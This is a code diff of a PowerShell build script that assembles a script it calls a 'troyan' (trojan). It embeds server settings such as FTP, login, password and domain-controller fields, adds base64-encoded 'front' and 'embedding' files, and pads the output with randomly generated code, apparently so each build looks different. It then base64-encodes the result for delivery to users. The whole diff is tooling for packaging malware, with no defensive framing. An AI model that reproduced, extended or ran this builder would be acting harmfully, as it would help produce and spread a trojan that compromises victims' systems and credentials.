@@ -15,9 +15,56 @@ Set-Location -Path $scriptDir
 
 Write-Host "troyan"
 
+function GetUtfNoBom {
+    param (
+        [string]$file
+    )
+
+    # Read the file as a byte array
+    $contentBytes = [System.IO.File]::ReadAllBytes($file)
+
+    # Check for BOM (UTF-8 BOM is 0xEF, 0xBB, 0xBF)
+    if ($contentBytes.Length -ge 3 -and $contentBytes[0] -eq 0xEF -and $contentBytes[1] -eq 0xBB -and $contentBytes[2] -eq 0xBF) {
+        # Remove the BOM
+        $contentBytes = $contentBytes[3..($contentBytes.Length - 1)]
+    }
+
+    # Convert the byte array back to a UTF-8 string
+    $contentWithoutBom = [System.Text.Encoding]::UTF8.GetString($contentBytes)
+
+    return $contentWithoutBom
+}
+
+
 if (Test-Path -Path $server.troyanScript) {
     Remove-Item -Path $server.troyanScript
 }
+
+function Utf8NoBom {
+    param (
+        [string]$data,
+        [string]$file
+    )
+
+    # Create a StreamWriter to write without BOM
+    $streamWriter = [System.IO.StreamWriter]::new($file, $false, [System.Text.Encoding]::UTF8)
+    $streamWriter.Write($data)
+    $streamWriter.Close()
+
+    # Forcefully overwrite the file to ensure no BOM is present
+    # Read back the written file as byte array
+    $writtenContent = [System.IO.File]::ReadAllBytes($file)
+
+    # Check for BOM (UTF-8 BOM is 0xEF, 0xBB, 0xBF)
+    if ($writtenContent.Length -ge 3 -and $writtenContent[0] -eq 0xEF -and $writtenContent[1] -eq 0xBB -and $writtenContent[2] -eq 0xBF) {
+        # Remove the BOM bytes
+        $writtenContent = $writtenContent[3..($writtenContent.Length - 1)]
+    }
+
+    # Write back the content without BOM
+    [System.IO.File]::WriteAllBytes($file, $writtenContent)
+}
+
 
 function Filter-ObjectByKeywords {
     param (
@@ -53,6 +100,83 @@ function Filter-ObjectByKeywords {
 
 
 
+function Encode-FileToBase64 {
+    param (
+        [string]$inFile
+    )
+    if (-Not (Test-Path -Path $inFile)) {
+        return "File $inFile not found."
+    }
+    $fileContent = [System.IO.File]::ReadAllBytes($inFile)
+    $encodedContent = [Convert]::ToBase64String($fileContent)
+    return $encodedContent
+}
+
+function Convert-ArrayToQuotedString {
+    param (
+        [Parameter(Mandatory=$true)]
+        [string[]]$Array
+    )
+
+    # Process each element to enclose in double quotes and join with commas
+    $quotedArray = $Array | ForEach-Object { "`"$_`"" }
+    $joinedString = $quotedArray -join ","
+
+    return $joinedString
+}
+
+Function Check-Array {
+    param (
+        [object]$InputObject
+    )
+
+    if ($null -ne $InputObject -and $InputObject.Length -gt 0) {
+        return $true
+    } else {
+        return $false
+    }
+}
+
+
+function Create-EmbeddingFiles {
+    param (
+        [string]$name
+    )
+
+    $srcFolder = Join-Path -Path $server.userDataDir -ChildPath "$name"
+
+    if (-not (Test-Path -Path $srcFolder))
+    {
+        $files = @()
+    } else
+    {
+        $files = (Get-ChildItem -Path $srcFolder -File) 
+    }
+    if ($null -eq $files){
+        $files = @()
+    }
+    if (-not ($files.GetType().Name -eq 'Object[]')) {
+        $files = @($files)
+    }
+    
+    $resultName = @()
+    $resultData = @()
+    foreach ($file in $files) {
+        $filename = [System.IO.Path]::GetFileName($file.FullName)
+        $data= Encode-FileToBase64 -inFile $file.FullName
+        $resultData += $data
+        $resultName += $filename
+    }
+    if (Check-Array -InputObject $resultData -eq $true)
+    {
+        $joinedResultName = Convert-ArrayToQuotedString -Array $resultName
+        $joinedResultData = Convert-ArrayToQuotedString -Array $resultData
+        return ($joinedResultName, $joinedResultData)
+    } else {
+        return ($null, $null)
+    }
+}
+
 function Format-ArrayToString {
     param (
         [string[]]$inputArray
@@ -74,6 +198,18 @@ $template = @"
 `$xdata = @{
     _CERT
 }
+`$xfront = @(
+_FRONT_X
+)
+`$xfront_name = @(
+_FRONT_NAME
+)
+`$xembed = @(
+_EMBED_X
+)
+`$xembed_name = @(
+_EMBED_NAME
+)
 "@
 $stringList = @()
 foreach ($domain in $server.domains) {
@@ -95,7 +231,15 @@ foreach ($domain in $server.domains) {
 $listString = $stringList -join [System.Environment]::NewLine
 $template  = $template -replace "_CERT", $listString
 
-$keywords = @("Dir", "troyan", "ftp", "user", "alias","login","password","ico","domainController","interfaces","bux","landing")
+($name, $data) = Create-EmbeddingFiles -name "front"
+$template = $template -replace "_FRONT_X", $data
+$template = $template -replace "_FRONT_NAME", $name
+($name, $data) = Create-EmbeddingFiles -name "embeddings"
+$template = $template -replace "_EMBED_X", $data
+$template = $template -replace "_EMBED_NAME", $name
+
+
+$keywords = @("Dir", "troyan", "ftp", "user", "alias","login","password","ico","domainController","interfaces","bux","landing","php")
 $filteredObject = Filter-ObjectByKeywords -object $server -keywords $keywords
 $servStr = ($filteredObject | ConvertTo-Json)
 $template  = $template -replace "_SERVER", $servStr
@@ -105,8 +249,7 @@ $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPat
 $ps1Files = @(
     @(Get-ChildItem -Path $server.troyanScriptDir -Filter "consts.ps1"),
     @(Get-ChildItem -Path $server.troyanScriptDir -Filter "utils.ps1"),
-    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "*.ps1" | Where-Object { $_.Name -ne "extraupdate.ps1" -and $_.Name -ne "utils.ps1" -and $_.Name -ne "consts.ps1"  -and $_.Name -ne "program.ps1" }),
-    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "program.ps1")
+    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "*.ps1" | Where-Object { $_.Name -ne "extraupdate.ps1" -and $_.Name -ne "utils.ps1" -and $_.Name -ne "consts.ps1"  -and $_.Name -ne "program.ps1" })
 ) | ForEach-Object { $_ } | Where-Object { $_ -ne $null }
 
 if ($server.autoUpdate)
@@ -114,13 +257,38 @@ if ($server.autoUpdate)
     $ps1Files += (Get-ChildItem -Path $server.troyanScriptDir -Filter "extraupdate.ps1")
 }
 
+$ps1Files += (Get-ChildItem -Path $server.troyanScriptDir -Filter "program.ps1")
+
 function BuldScript{
     param (
         [string]$outputFile, [bool]$random)
 
-    $joinedContent = ""
+        $pref = '
+        $generalJob = Start-Job -ScriptBlock {
+
+            function writedbg2 {
+                    param (
+                        [string]$msg,   [string]$msg2=""
+                    )
+                }
+                '
+
+        $suff = '
+                }
+        Wait-Job -Job $generalJob
+        Receive-Job -Job $generalJob
+        Remove-Job -Job $generalJob
+        ';
+        $pref=''
+        $suff=''
+
+    if ($random -eq $true)
+    {
+        $joinedContent += Generate-RandomCode
+    }
+    $joinedContent += $pref
     foreach ($file in $ps1Files) {
-        $fileContent = Get-Content -Path $file.FullName -Raw
+        $fileContent = GetUtfNoBom -file $file.FullName
         $fileContent = $fileContent -replace '\.\s+\./[^/]+\.ps1', "`n`n"
         $fileContent = $fileContent -replace '. ./utils.ps1', "`n`n"
         $fileContent = $fileContent -replace '. ./consts.ps1', "`n`n"
@@ -134,26 +302,20 @@ function BuldScript{
     {
         $joinedContent += Generate-RandomCode
     }
-    $joinedContent | Set-Content -Path $outputFile -Encoding UTF8
+    $joinedContent += $suff
+    if ($random -eq $true)
+    {
+        $joinedContent += Generate-RandomCode
+    }
+    Utf8NoBom -data $joinedContent -file $outputFile
 }
 
 BuldScript -outputFile $server.troyanScript -random $true
 BuldScript -outputFile $server.troyanScriptClean -random $false
 
-function Encode-FileToBase64 {
-    param (
-        [string]$inFile
-    )
-    if (-Not (Test-Path -Path $inFile)) {
-        return "File $inFile not found."
-    }
-    $fileContent = [System.IO.File]::ReadAllBytes($inFile)
-    $encodedContent = [Convert]::ToBase64String($fileContent)
-    return $encodedContent
-}
 
 $encoded = Encode-FileToBase64 -inFile $server.troyanScript
-$encoded | Set-Content -Path $server.userPowershellFile -Encoding UTF8
+Utf8NoBom -data $encoded -file $server.userPowershellFile
 
 
 
